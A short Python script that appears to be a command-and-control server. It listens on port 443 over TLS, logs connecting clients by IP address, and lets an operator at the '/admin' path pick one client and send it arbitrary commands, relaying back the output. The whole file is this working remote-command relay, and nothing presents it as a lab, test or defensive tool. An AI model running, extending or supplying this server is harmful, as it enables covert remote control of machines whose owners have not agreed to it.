#!/usr/bin/env python

import asyncio
import pathlib
import ssl
import websockets

users = {}

async def conn_handler(websocket, path):
    if (path == "/"):
        users[websocket] = websocket.remote_address[0]
        print("Added new User: " + websocket.remote_address[0])
    elif (path == "/admin"):
        print("Admint connected!\nSending client List...")
        str = "["
        for k,v in users.items():
            str += "\"" + v + "\", "
        await websocket.send(str[:len(str)-2] + "]")
        print("Awaiting client selection...")
        clnt = await websocket.recv()
        while True:
            print("Awaitting command...")
            cmd = await websocket.recv()
            for k,v in users.items():
                if(v == clnt):
                    await k.send(cmd)
                    res = await k.recv()
                    await websocket.send(res) 
    await asyncio.sleep(1000)
ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
localhost_pem = pathlib.Path(__file__).with_name("cert.pem")
ssl_context.load_cert_chain(localhost_pem, "key.pem")

start_server = websockets.serve(
    conn_handler, "0.0.0.0", 443, ssl=ssl_context,
)

asyncio.get_event_loop().run_until_complete(start_server)
asyncio.get_event_loop().run_forever()
